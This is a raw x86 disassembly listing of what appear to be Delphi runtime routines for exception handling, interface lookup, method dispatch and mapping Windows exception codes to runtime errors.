  403044:	55                   	push   %ebp
  403045:	8b ec                	mov    %esp,%ebp
  403047:	83 c4 f8             	add    $0xfffffff8,%esp
  40304a:	53                   	push   %ebx
  40304b:	56                   	push   %esi
  40304c:	57                   	push   %edi
  40304d:	33 db                	xor    %ebx,%ebx
  40304f:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403052:	8b f1                	mov    %ecx,%esi
  403054:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403057:	8b f8                	mov    %eax,%edi
  403059:	33 c0                	xor    %eax,%eax
  40305b:	55                   	push   %ebp
  40305c:	68 c8 30 40 00       	push   $0x4030c8
  403061:	64 ff 30             	push   %fs:(%eax)
  403064:	64 89 20             	mov    %esp,%fs:(%eax)
  403067:	33 c0                	xor    %eax,%eax
  403069:	89 06                	mov    %eax,(%esi)
  40306b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40306e:	8b 07                	mov    (%edi),%eax
  403070:	e8 63 00 00 00       	call   0x4030d8
  403075:	8b d8                	mov    %eax,%ebx
  403077:	85 db                	test   %ebx,%ebx
  403079:	74 31                	je     0x4030ac
  40307b:	8b 43 14             	mov    0x14(%ebx),%eax
  40307e:	85 c0                	test   %eax,%eax
  403080:	74 13                	je     0x403095
  403082:	03 f8                	add    %eax,%edi
  403084:	89 3e                	mov    %edi,(%esi)
  403086:	83 3e 00             	cmpl   $0x0,(%esi)
  403089:	74 21                	je     0x4030ac
  40308b:	8b 06                	mov    (%esi),%eax
  40308d:	50                   	push   %eax
  40308e:	8b 00                	mov    (%eax),%eax
  403090:	ff 50 04             	call   *0x4(%eax)
  403093:	eb 17                	jmp    0x4030ac
  403095:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  403098:	8b 53 18             	mov    0x18(%ebx),%edx
  40309b:	8b c7                	mov    %edi,%eax
  40309d:	e8 72 ff ff ff       	call   0x403014
  4030a2:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4030a5:	8b c6                	mov    %esi,%eax
  4030a7:	e8 a0 1e 00 00       	call   0x404f4c
  4030ac:	83 3e 00             	cmpl   $0x0,(%esi)
  4030af:	0f 95 c3             	setne  %bl
  4030b2:	33 c0                	xor    %eax,%eax
  4030b4:	5a                   	pop    %edx
  4030b5:	59                   	pop    %ecx
  4030b6:	59                   	pop    %ecx
  4030b7:	64 89 10             	mov    %edx,%fs:(%eax)
  4030ba:	68 cf 30 40 00       	push   $0x4030cf
  4030bf:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4030c2:	e8 6d 1e 00 00       	call   0x404f34
  4030c7:	c3                   	ret
  4030c8:	e9 9f 03 00 00       	jmp    0x40346c
  4030cd:	eb f0                	jmp    0x4030bf
  4030cf:	8b c3                	mov    %ebx,%eax
  4030d1:	5f                   	pop    %edi
  4030d2:	5e                   	pop    %esi
  4030d3:	5b                   	pop    %ebx
  4030d4:	59                   	pop    %ecx
  4030d5:	59                   	pop    %ecx
  4030d6:	5d                   	pop    %ebp
  4030d7:	c3                   	ret
  4030d8:	53                   	push   %ebx
  4030d9:	56                   	push   %esi
  4030da:	89 c3                	mov    %eax,%ebx
  4030dc:	8b 43 b8             	mov    -0x48(%ebx),%eax
  4030df:	85 c0                	test   %eax,%eax
  4030e1:	74 29                	je     0x40310c
  4030e3:	8b 08                	mov    (%eax),%ecx
  4030e5:	83 c0 04             	add    $0x4,%eax
  4030e8:	8b 32                	mov    (%edx),%esi
  4030ea:	3b 30                	cmp    (%eax),%esi
  4030ec:	75 18                	jne    0x403106
  4030ee:	8b 72 04             	mov    0x4(%edx),%esi
  4030f1:	3b 70 04             	cmp    0x4(%eax),%esi
  4030f4:	75 10                	jne    0x403106
  4030f6:	8b 72 08             	mov    0x8(%edx),%esi
  4030f9:	3b 70 08             	cmp    0x8(%eax),%esi
  4030fc:	75 08                	jne    0x403106
  4030fe:	8b 72 0c             	mov    0xc(%edx),%esi
  403101:	3b 70 0c             	cmp    0xc(%eax),%esi
  403104:	74 13                	je     0x403119
  403106:	83 c0 1c             	add    $0x1c,%eax
  403109:	49                   	dec    %ecx
  40310a:	75 dc                	jne    0x4030e8
  40310c:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  40310f:	85 db                	test   %ebx,%ebx
  403111:	74 04                	je     0x403117
  403113:	8b 1b                	mov    (%ebx),%ebx
  403115:	eb c5                	jmp    0x4030dc
  403117:	31 c0                	xor    %eax,%eax
  403119:	5e                   	pop    %esi
  40311a:	5b                   	pop    %ebx
  40311b:	c3                   	ret
  40311c:	53                   	push   %ebx
  40311d:	56                   	push   %esi
  40311e:	8b f2                	mov    %edx,%esi
  403120:	8b d8                	mov    %eax,%ebx
  403122:	85 db                	test   %ebx,%ebx
  403124:	74 0d                	je     0x403133
  403126:	8b d6                	mov    %esi,%edx
  403128:	8b 03                	mov    (%ebx),%eax
  40312a:	e8 59 00 00 00       	call   0x403188
  40312f:	84 c0                	test   %al,%al
  403131:	75 05                	jne    0x403138
  403133:	33 c0                	xor    %eax,%eax
  403135:	5e                   	pop    %esi
  403136:	5b                   	pop    %ebx
  403137:	c3                   	ret
  403138:	b0 01                	mov    $0x1,%al
  40313a:	5e                   	pop    %esi
  40313b:	5b                   	pop    %ebx
  40313c:	c3                   	ret
  40313d:	8d 40 00             	lea    0x0(%eax),%eax
  403140:	57                   	push   %edi
  403141:	96                   	xchg   %eax,%esi
  403142:	eb 02                	jmp    0x403146
  403144:	8b 36                	mov    (%esi),%esi
  403146:	8b 7e d0             	mov    -0x30(%esi),%edi
  403149:	85 ff                	test   %edi,%edi
  40314b:	74 0d                	je     0x40315a
  40314d:	0f b7 0f             	movzwl (%edi),%ecx
  403150:	51                   	push   %ecx
  403151:	83 c7 02             	add    $0x2,%edi
  403154:	f2 66 af             	repnz scas %es:(%edi),%ax
  403157:	74 0a                	je     0x403163
  403159:	59                   	pop    %ecx
  40315a:	8b 76 dc             	mov    -0x24(%esi),%esi
  40315d:	85 f6                	test   %esi,%esi
  40315f:	75 e3                	jne    0x403144
  403161:	5f                   	pop    %edi
  403162:	c3                   	ret
  403163:	58                   	pop    %eax
  403164:	01 c0                	add    %eax,%eax
  403166:	29 c8                	sub    %ecx,%eax
  403168:	8b 74 47 fc          	mov    -0x4(%edi,%eax,2),%esi
  40316c:	5f                   	pop    %edi
  40316d:	c3                   	ret
  40316e:	8b c0                	mov    %eax,%eax
  403170:	50                   	push   %eax
  403171:	51                   	push   %ecx
  403172:	8b 00                	mov    (%eax),%eax
  403174:	e8 c7 ff ff ff       	call   0x403140
  403179:	59                   	pop    %ecx
  40317a:	58                   	pop    %eax
  40317b:	74 02                	je     0x40317f
  40317d:	ff e6                	jmp    *%esi
  40317f:	59                   	pop    %ecx
  403180:	e9 b7 f7 ff ff       	jmp    0x40293c
  403185:	c3                   	ret
  403186:	8b c0                	mov    %eax,%eax
  403188:	eb 02                	jmp    0x40318c
  40318a:	8b 00                	mov    (%eax),%eax
  40318c:	39 d0                	cmp    %edx,%eax
  40318e:	74 08                	je     0x403198
  403190:	8b 40 dc             	mov    -0x24(%eax),%eax
  403193:	85 c0                	test   %eax,%eax
  403195:	75 f3                	jne    0x40318a
  403197:	c3                   	ret
  403198:	b0 01                	mov    $0x1,%al
  40319a:	c3                   	ret
  40319b:	90                   	nop
  40319c:	b8 ff ff 00 80       	mov    $0x8000ffff,%eax
  4031a1:	c3                   	ret
  4031a2:	8b c0                	mov    %eax,%eax
  4031a4:	c3                   	ret
  4031a5:	8d 40 00             	lea    0x0(%eax),%eax
  4031a8:	c3                   	ret
  4031a9:	8d 40 00             	lea    0x0(%eax),%eax
  4031ac:	c3                   	ret
  4031ad:	8d 40 00             	lea    0x0(%eax),%eax
  4031b0:	56                   	push   %esi
  4031b1:	66 8b 32             	mov    (%edx),%si
  4031b4:	66 09 f6             	or     %si,%si
  4031b7:	74 17                	je     0x4031d0
  4031b9:	66 81 fe 00 c0       	cmp    $0xc000,%si
  4031be:	73 10                	jae    0x4031d0
  4031c0:	50                   	push   %eax
  4031c1:	8b 00                	mov    (%eax),%eax
  4031c3:	e8 78 ff ff ff       	call   0x403140
  4031c8:	58                   	pop    %eax
  4031c9:	74 05                	je     0x4031d0
  4031cb:	89 f1                	mov    %esi,%ecx
  4031cd:	5e                   	pop    %esi
  4031ce:	ff e1                	jmp    *%ecx
  4031d0:	5e                   	pop    %esi
  4031d1:	8b 08                	mov    (%eax),%ecx
  4031d3:	ff 61 f0             	jmp    *-0x10(%ecx)
  4031d6:	c3                   	ret
  4031d7:	90                   	nop
  4031d8:	52                   	push   %edx
  4031d9:	51                   	push   %ecx
  4031da:	53                   	push   %ebx
  4031db:	84 d2                	test   %dl,%dl
  4031dd:	7c 03                	jl     0x4031e2
  4031df:	ff 50 f4             	call   *-0xc(%eax)
  4031e2:	31 d2                	xor    %edx,%edx
  4031e4:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4031e8:	64 8b 1a             	mov    %fs:(%edx),%ebx
  4031eb:	89 19                	mov    %ebx,(%ecx)
  4031ed:	89 69 08             	mov    %ebp,0x8(%ecx)
  4031f0:	c7 41 04 01 32 40 00 	movl   $0x403201,0x4(%ecx)
  4031f7:	89 41 0c             	mov    %eax,0xc(%ecx)
  4031fa:	64 89 0a             	mov    %ecx,%fs:(%edx)
  4031fd:	5b                   	pop    %ebx
  4031fe:	59                   	pop    %ecx
  4031ff:	5a                   	pop    %edx
  403200:	c3                   	ret
  403201:	e9 3a 01 00 00       	jmp    0x403340
  403206:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40320a:	8b 40 0c             	mov    0xc(%eax),%eax
  40320d:	85 c0                	test   %eax,%eax
  40320f:	74 0e                	je     0x40321f
  403211:	8b 08                	mov    (%eax),%ecx
  403213:	b2 81                	mov    $0x81,%dl
  403215:	50                   	push   %eax
  403216:	ff 51 fc             	call   *-0x4(%ecx)
  403219:	58                   	pop    %eax
  40321a:	e8 09 00 00 00       	call   0x403228
  40321f:	e8 a8 02 00 00       	call   0x4034cc
  403224:	c3                   	ret
  403225:	8d 40 00             	lea    0x0(%eax),%eax
  403228:	8b 10                	mov    (%eax),%edx
  40322a:	ff 52 f8             	call   *-0x8(%edx)
  40322d:	c3                   	ret
  40322e:	8b c0                	mov    %eax,%eax
  403230:	53                   	push   %ebx
  403231:	8b d8                	mov    %eax,%ebx
  403233:	8b c3                	mov    %ebx,%eax
  403235:	8b 10                	mov    (%eax),%edx
  403237:	ff 52 e4             	call   *-0x1c(%edx)
  40323a:	8b c3                	mov    %ebx,%eax
  40323c:	5b                   	pop    %ebx
  40323d:	c3                   	ret
  40323e:	8b c0                	mov    %eax,%eax
  403240:	84 d2                	test   %dl,%dl
  403242:	7f 01                	jg     0x403245
  403244:	c3                   	ret
  403245:	50                   	push   %eax
  403246:	52                   	push   %edx
  403247:	8b 10                	mov    (%eax),%edx
  403249:	ff 52 e8             	call   *-0x18(%edx)
  40324c:	5a                   	pop    %edx
  40324d:	58                   	pop    %eax
  40324e:	c3                   	ret
  40324f:	90                   	nop
  403250:	80 3d 24 40 41 00 01 	cmpb   $0x1,0x414024
  403257:	76 11                	jbe    0x40326a
  403259:	6a 00                	push   $0x0
  40325b:	6a 00                	push   $0x0
  40325d:	6a 00                	push   $0x0
  40325f:	68 df fa ed 0e       	push   $0xeedfadf
  403264:	ff 15 14 40 42 00    	call   *0x424014
  40326a:	c3                   	ret
  40326b:	90                   	nop
  40326c:	80 3d 24 40 41 00 00 	cmpb   $0x0,0x414024
  403273:	74 17                	je     0x40328c
  403275:	50                   	push   %eax
  403276:	50                   	push   %eax
  403277:	52                   	push   %edx
  403278:	54                   	push   %esp
  403279:	6a 02                	push   $0x2
  40327b:	6a 00                	push   $0x0
  40327d:	68 e4 fa ed 0e       	push   $0xeedfae4
  403282:	ff 15 14 40 42 00    	call   *0x424014
  403288:	83 c4 08             	add    $0x8,%esp
  40328b:	58                   	pop    %eax
  40328c:	c3                   	ret
  40328d:	8d 40 00             	lea    0x0(%eax),%eax
  403290:	54                   	push   %esp
  403291:	6a 01                	push   $0x1
  403293:	6a 00                	push   $0x0
  403295:	68 e0 fa ed 0e       	push   $0xeedfae0
  40329a:	ff 15 14 40 42 00    	call   *0x424014
  4032a0:	83 c4 04             	add    $0x4,%esp
  4032a3:	58                   	pop    %eax
  4032a4:	c3                   	ret
  4032a5:	8d 40 00             	lea    0x0(%eax),%eax
  4032a8:	80 3d 24 40 41 00 01 	cmpb   $0x1,0x414024
  4032af:	76 07                	jbe    0x4032b8
  4032b1:	50                   	push   %eax
  4032b2:	53                   	push   %ebx
  4032b3:	e9 d8 ff ff ff       	jmp    0x403290
  4032b8:	c3                   	ret
  4032b9:	8d 40 00             	lea    0x0(%eax),%eax
  4032bc:	85 c9                	test   %ecx,%ecx
  4032be:	74 19                	je     0x4032d9
  4032c0:	8b 41 01             	mov    0x1(%ecx),%eax
  4032c3:	80 39 e9             	cmpb   $0xe9,(%ecx)
  4032c6:	74 0c                	je     0x4032d4
  4032c8:	80 39 eb             	cmpb   $0xeb,(%ecx)
  4032cb:	75 0c                	jne    0x4032d9
  4032cd:	0f be c0             	movsbl %al,%eax
  4032d0:	41                   	inc    %ecx
  4032d1:	41                   	inc    %ecx
  4032d2:	eb 03                	jmp    0x4032d7
  4032d4:	83 c1 05             	add    $0x5,%ecx
  4032d7:	01 c1                	add    %eax,%ecx
  4032d9:	c3                   	ret
  4032da:	8b c0                	mov    %eax,%eax
  4032dc:	80 3d 24 40 41 00 01 	cmpb   $0x1,0x414024
  4032e3:	76 1d                	jbe    0x403302
  4032e5:	50                   	push   %eax
  4032e6:	52                   	push   %edx
  4032e7:	51                   	push   %ecx
  4032e8:	e8 cf ff ff ff       	call   0x4032bc
  4032ed:	51                   	push   %ecx
  4032ee:	54                   	push   %esp
  4032ef:	6a 01                	push   $0x1
  4032f1:	6a 00                	push   $0x0
  4032f3:	68 e1 fa ed 0e       	push   $0xeedfae1
  4032f8:	ff 15 14 40 42 00    	call   *0x424014
  4032fe:	59                   	pop    %ecx
  4032ff:	59                   	pop    %ecx
  403300:	5a                   	pop    %edx
  403301:	58                   	pop    %eax
  403302:	c3                   	ret
  403303:	90                   	nop
  403304:	80 3d 24 40 41 00 01 	cmpb   $0x1,0x414024
  40330b:	76 12                	jbe    0x40331f
  40330d:	52                   	push   %edx
  40330e:	54                   	push   %esp
  40330f:	6a 01                	push   $0x1
  403311:	6a 00                	push   $0x0
  403313:	68 e2 fa ed 0e       	push   $0xeedfae2
  403318:	ff 15 14 40 42 00    	call   *0x424014
  40331e:	5a                   	pop    %edx
  40331f:	c3                   	ret
  403320:	50                   	push   %eax
  403321:	52                   	push   %edx
  403322:	80 3d 24 40 41 00 01 	cmpb   $0x1,0x414024
  403329:	76 10                	jbe    0x40333b
  40332b:	54                   	push   %esp
  40332c:	6a 02                	push   $0x2
  40332e:	6a 00                	push   $0x0
  403330:	68 e3 fa ed 0e       	push   $0xeedfae3
  403335:	ff 15 14 40 42 00    	call   *0x424014
  40333b:	5a                   	pop    %edx
  40333c:	58                   	pop    %eax
  40333d:	c3                   	ret
  40333e:	8b c0                	mov    %eax,%eax
  403340:	8b 44 24 04          	mov    0x4(%esp),%eax
  403344:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  40334b:	0f 85 13 01 00 00    	jne    0x403464
  403351:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  403357:	8b 50 18             	mov    0x18(%eax),%edx
  40335a:	8b 48 14             	mov    0x14(%eax),%ecx
  40335d:	74 6e                	je     0x4033cd
  40335f:	fc                   	cld
  403360:	e8 8f fb ff ff       	call   0x402ef4
  403365:	8b 15 10 40 42 00    	mov    0x424010,%edx
  40336b:	85 d2                	test   %edx,%edx
  40336d:	0f 84 f1 00 00 00    	je     0x403464
  403373:	ff d2                	call   *%edx
  403375:	85 c0                	test   %eax,%eax
  403377:	0f 84 e7 00 00 00    	je     0x403464
  40337d:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403381:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403385:	81 39 ce fa ef 0e    	cmpl   $0xeefface,(%ecx)
  40338b:	74 37                	je     0x4033c4
  40338d:	e8 da fe ff ff       	call   0x40326c
  403392:	80 3d 28 40 41 00 00 	cmpb   $0x0,0x414028
  403399:	76 29                	jbe    0x4033c4
  40339b:	80 3d 24 40 41 00 00 	cmpb   $0x0,0x414024
  4033a2:	77 20                	ja     0x4033c4
  4033a4:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4033a8:	50                   	push   %eax
  4033a9:	51                   	push   %ecx
  4033aa:	e8 c9 dd ff ff       	call   0x401178
  4033af:	83 f8 00             	cmp    $0x0,%eax
  4033b2:	58                   	pop    %eax
  4033b3:	0f 84 ab 00 00 00    	je     0x403464
  4033b9:	89 c2                	mov    %eax,%edx
  4033bb:	8b 44 24 04          	mov    0x4(%esp),%eax
  4033bf:	8b 48 0c             	mov    0xc(%eax),%ecx
  4033c2:	eb 30                	jmp    0x4033f4
  4033c4:	89 c2                	mov    %eax,%edx
  4033c6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4033ca:	8b 48 0c             	mov    0xc(%eax),%ecx
  4033cd:	80 3d 28 40 41 00 01 	cmpb   $0x1,0x414028
  4033d4:	76 1e                	jbe    0x4033f4
  4033d6:	80 3d 24 40 41 00 00 	cmpb   $0x0,0x414024
  4033dd:	77 15                	ja     0x4033f4
  4033df:	50                   	push   %eax
  4033e0:	8d 44 24 08          	lea    0x8(%esp),%eax
  4033e4:	52                   	push   %edx
  4033e5:	51                   	push   %ecx
  4033e6:	50                   	push   %eax
  4033e7:	e8 8c dd ff ff       	call   0x401178
  4033ec:	83 f8 00             	cmp    $0x0,%eax
  4033ef:	59                   	pop    %ecx
  4033f0:	5a                   	pop    %edx
  4033f1:	58                   	pop    %eax
  4033f2:	74 70                	je     0x403464
  4033f4:	83 48 04 02          	orl    $0x2,0x4(%eax)
  4033f8:	53                   	push   %ebx
  4033f9:	31 db                	xor    %ebx,%ebx
  4033fb:	56                   	push   %esi
  4033fc:	57                   	push   %edi
  4033fd:	55                   	push   %ebp
  4033fe:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  403401:	53                   	push   %ebx
  403402:	50                   	push   %eax
  403403:	52                   	push   %edx
  403404:	51                   	push   %ecx
  403405:	8b 54 24 28          	mov    0x28(%esp),%edx
  403409:	6a 00                	push   $0x0
  40340b:	50                   	push   %eax
  40340c:	68 18 34 40 00       	push   $0x403418
  403411:	52                   	push   %edx
  403412:	ff 15 18 40 42 00    	call   *0x424018
  403418:	8b 7c 24 28          	mov    0x28(%esp),%edi
  40341c:	e8 07 22 00 00       	call   0x405628
  403421:	ff b0 00 00 00 00    	push   0x0(%eax)
  403427:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  40342d:	8b 6f 08             	mov    0x8(%edi),%ebp
  403430:	8b 5f 04             	mov    0x4(%edi),%ebx
  403433:	c7 47 04 44 34 40 00 	movl   $0x403444,0x4(%edi)
  40343a:	83 c3 05             	add    $0x5,%ebx
  40343d:	e8 66 fe ff ff       	call   0x4032a8
  403442:	ff e3                	jmp    *%ebx
  403444:	e9 23 00 00 00       	jmp    0x40346c
  403449:	e8 da 21 00 00       	call   0x405628
  40344e:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  403454:	8b 11                	mov    (%ecx),%edx
  403456:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  40345c:	8b 41 08             	mov    0x8(%ecx),%eax
  40345f:	e9 2c fb ff ff       	jmp    0x402f90
  403464:	b8 01 00 00 00       	mov    $0x1,%eax
  403469:	c3                   	ret
  40346a:	8b c0                	mov    %eax,%eax
  40346c:	8b 44 24 04          	mov    0x4(%esp),%eax
  403470:	8b 54 24 08          	mov    0x8(%esp),%edx
  403474:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  40347b:	74 1f                	je     0x40349c
  40347d:	8b 4a 04             	mov    0x4(%edx),%ecx
  403480:	c7 42 04 9c 34 40 00 	movl   $0x40349c,0x4(%edx)
  403487:	53                   	push   %ebx
  403488:	56                   	push   %esi
  403489:	57                   	push   %edi
  40348a:	55                   	push   %ebp
  40348b:	8b 6a 08             	mov    0x8(%edx),%ebp
  40348e:	83 c1 05             	add    $0x5,%ecx
  403491:	e8 46 fe ff ff       	call   0x4032dc
  403496:	ff d1                	call   *%ecx
  403498:	5d                   	pop    %ebp
  403499:	5f                   	pop    %edi
  40349a:	5e                   	pop    %esi
  40349b:	5b                   	pop    %ebx
  40349c:	b8 01 00 00 00       	mov    $0x1,%eax
  4034a1:	c3                   	ret
  4034a2:	8b c0                	mov    %eax,%eax
  4034a4:	09 c0                	or     %eax,%eax
  4034a6:	75 0a                	jne    0x4034b2
  4034a8:	b8 d8 00 00 00       	mov    $0xd8,%eax
  4034ad:	e8 86 05 00 00       	call   0x403a38
  4034b2:	5a                   	pop    %edx
  4034b3:	54                   	push   %esp
  4034b4:	55                   	push   %ebp
  4034b5:	57                   	push   %edi
  4034b6:	56                   	push   %esi
  4034b7:	53                   	push   %ebx
  4034b8:	50                   	push   %eax
  4034b9:	52                   	push   %edx
  4034ba:	54                   	push   %esp
  4034bb:	6a 07                	push   $0x7
  4034bd:	6a 01                	push   $0x1
  4034bf:	68 de fa ed 0e       	push   $0xeedfade
  4034c4:	52                   	push   %edx
  4034c5:	ff 25 14 40 42 00    	jmp    *0x424014
  4034cb:	c3                   	ret
  4034cc:	8b 44 24 30          	mov    0x30(%esp),%eax
  4034d0:	c7 40 04 17 35 40 00 	movl   $0x403517,0x4(%eax)
  4034d7:	e8 4c 21 00 00       	call   0x405628
  4034dc:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  4034e2:	8b 0a                	mov    (%edx),%ecx
  4034e4:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  4034ea:	8b 42 0c             	mov    0xc(%edx),%eax
  4034ed:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  4034f1:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  4034f7:	74 0d                	je     0x403506
  4034f9:	8b 42 08             	mov    0x8(%edx),%eax
  4034fc:	e8 8f fa ff ff       	call   0x402f90
  403501:	e8 4a fd ff ff       	call   0x403250
  403506:	31 c0                	xor    %eax,%eax
  403508:	83 c4 14             	add    $0x14,%esp
  40350b:	64 8b 10             	mov    %fs:(%eax),%edx
  40350e:	59                   	pop    %ecx
  40350f:	8b 12                	mov    (%edx),%edx
  403511:	89 11                	mov    %edx,(%ecx)
  403513:	5d                   	pop    %ebp
  403514:	5f                   	pop    %edi
  403515:	5e                   	pop    %esi
  403516:	5b                   	pop    %ebx
  403517:	b8 01 00 00 00       	mov    $0x1,%eax
  40351c:	c3                   	ret
  40351d:	8d 40 00             	lea    0x0(%eax),%eax
  403520:	e8 03 21 00 00       	call   0x405628
  403525:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  40352b:	8b 0a                	mov    (%edx),%ecx
  40352d:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  403533:	8b 42 08             	mov    0x8(%edx),%eax
  403536:	e8 55 fa ff ff       	call   0x402f90
  40353b:	5a                   	pop    %edx
  40353c:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  403540:	31 c0                	xor    %eax,%eax
  403542:	59                   	pop    %ecx
  403543:	64 89 08             	mov    %ecx,%fs:(%eax)
  403546:	58                   	pop    %eax
  403547:	5d                   	pop    %ebp
  403548:	e8 b7 fd ff ff       	call   0x403304
  40354d:	ff e2                	jmp    *%edx
  40354f:	c3                   	ret
  403550:	31 d2                	xor    %edx,%edx
  403552:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403556:	8b 44 24 04          	mov    0x4(%esp),%eax
  40355a:	83 c1 05             	add    $0x5,%ecx
  40355d:	64 89 02             	mov    %eax,%fs:(%edx)
  403560:	ff d1                	call   *%ecx
  403562:	c2 0c 00             	ret    $0xc
  403565:	c3                   	ret
  403566:	8b c0                	mov    %eax,%eax
  403568:	55                   	push   %ebp
  403569:	8b ec                	mov    %esp,%ebp
  40356b:	8b 55 08             	mov    0x8(%ebp),%edx
  40356e:	8b 02                	mov    (%edx),%eax
  403570:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  403575:	7f 2c                	jg     0x4035a3
  403577:	74 5c                	je     0x4035d5
  403579:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  40357e:	7f 15                	jg     0x403595
  403580:	74 57                	je     0x4035d9
  403582:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  403587:	74 5c                	je     0x4035e5
  403589:	2d 87 00 00 00       	sub    $0x87,%eax
  40358e:	74 3d                	je     0x4035cd
  403590:	48                   	dec    %eax
  403591:	74 4e                	je     0x4035e1
  403593:	eb 60                	jmp    0x4035f5
  403595:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  40359a:	83 e8 02             	sub    $0x2,%eax
  40359d:	72 36                	jb     0x4035d5
  40359f:	74 30                	je     0x4035d1
  4035a1:	eb 52                	jmp    0x4035f5
  4035a3:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  4035a8:	7f 11                	jg     0x4035bb
  4035aa:	74 3d                	je     0x4035e9
  4035ac:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  4035b1:	74 2e                	je     0x4035e1
  4035b3:	48                   	dec    %eax
  4035b4:	74 13                	je     0x4035c9
  4035b6:	48                   	dec    %eax
  4035b7:	74 24                	je     0x4035dd
  4035b9:	eb 3a                	jmp    0x4035f5
  4035bb:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  4035c0:	74 2f                	je     0x4035f1
  4035c2:	83 e8 3d             	sub    $0x3d,%eax
  4035c5:	74 26                	je     0x4035ed
  4035c7:	eb 2c                	jmp    0x4035f5
  4035c9:	b0 c8                	mov    $0xc8,%al
  4035cb:	eb 2a                	jmp    0x4035f7
  4035cd:	b0 c9                	mov    $0xc9,%al
  4035cf:	eb 26                	jmp    0x4035f7
  4035d1:	b0 cd                	mov    $0xcd,%al
  4035d3:	eb 22                	jmp    0x4035f7
  4035d5:	b0 cf                	mov    $0xcf,%al
  4035d7:	eb 1e                	jmp    0x4035f7
  4035d9:	b0 c8                	mov    $0xc8,%al
  4035db:	eb 1a                	jmp    0x4035f7
  4035dd:	b0 d7                	mov    $0xd7,%al
  4035df:	eb 16                	jmp    0x4035f7
  4035e1:	b0 ce                	mov    $0xce,%al
  4035e3:	eb 12                	jmp    0x4035f7
  4035e5:	b0 d8                	mov    $0xd8,%al
  4035e7:	eb 0e                	jmp    0x4035f7
  4035e9:	b0 da                	mov    $0xda,%al
  4035eb:	eb 0a                	jmp    0x4035f7
  4035ed:	b0 d9                	mov    $0xd9,%al
  4035ef:	eb 06                	jmp    0x4035f7
  4035f1:	b0 ca                	mov    $0xca,%al
  4035f3:	eb 02                	jmp    0x4035f7
  4035f5:	b0 ff                	mov    $0xff,%al
  4035f7:	25 ff 00 00 00       	and    $0xff,%eax
  4035fc:	8b 52 0c             	mov    0xc(%edx),%edx
  4035ff:	e8 b4 f0 ff ff       	call   0x4026b8
  403604:	5d                   	pop    %ebp
  403605:	c2 04 00             	ret    $0x4
  403608:	8b 44 24 04          	mov    0x4(%esp),%eax
  40360c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403613:	0f 85 89 00 00 00    	jne    0x4036a2
  403619:	80 3d 24 40 41 00 00 	cmpb   $0x0,0x414024
  403620:	77 0f                	ja     0x403631
  403622:	8d 44 24 04          	lea    0x4(%esp),%eax
  403626:	50                   	push   %eax
  403627:	e8 4c db ff ff       	call   0x401178
  40362c:	83 f8 00             	cmp    $0x0,%eax
  40362f:	74 71                	je     0x4036a2
  403631:	8b 44 24 04          	mov    0x4(%esp),%eax
  403635:	fc                   	cld
  403636:	e8 b9 f8 ff ff       	call   0x402ef4
  40363b:	8b 54 24 08          	mov    0x8(%esp),%edx
  40363f:	6a 00                	push   $0x0
  403641:	50                   	push   %eax
  403642:	68 4e 36 40 00       	push   $0x40364e
  403647:	52                   	push   %edx
  403648:	ff 15 18 40 42 00    	call   *0x424018
  40364e:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  403652:	81 3b de fa ed 0e    	cmpl   $0xeedfade,(%ebx)
  403658:	8b 53 14             	mov    0x14(%ebx),%edx
  40365b:	8b 43 18             	mov    0x18(%ebx),%eax
  40365e:	74 1d                	je     0x40367d
  403660:	8b 15 10 40 42 00    	mov    0x424010,%edx
  403666:	85 d2                	test   %edx,%edx
  403668:	0f 84 fa fe ff ff    	je     0x403568
  40366e:	89 d8                	mov    %ebx,%eax
  403670:	ff d2                	call   *%edx
  403672:	85 c0                	test   %eax,%eax
  403674:	0f 84 ee fe ff ff    	je     0x403568
  40367a:	8b 53 0c             	mov    0xc(%ebx),%edx
  40367d:	e8 9e fc ff ff       	call   0x403320
  403682:	8b 0d 04 40 42 00    	mov    0x424004,%ecx
  403688:	85 c9                	test   %ecx,%ecx
  40368a:	74 02                	je     0x40368e
  40368c:	ff d1                	call   *%ecx
  40368e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403692:	b8 d9 00 00 00       	mov    $0xd9,%eax
  403697:	8b 51 14             	mov    0x14(%ecx),%edx
  40369a:	89 14 24             	mov    %edx,(%esp)
  40369d:	e9 96 03 00 00       	jmp    0x403a38
  4036a2:	31 c0                	xor    %eax,%eax
  4036a4:	c3                   	ret
  4036a5:	8d 40 00             	lea    0x0(%eax),%eax
  4036a8:	31 d2                	xor    %edx,%edx
  4036aa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4036ad:	64 8b 0a             	mov    %fs:(%edx),%ecx
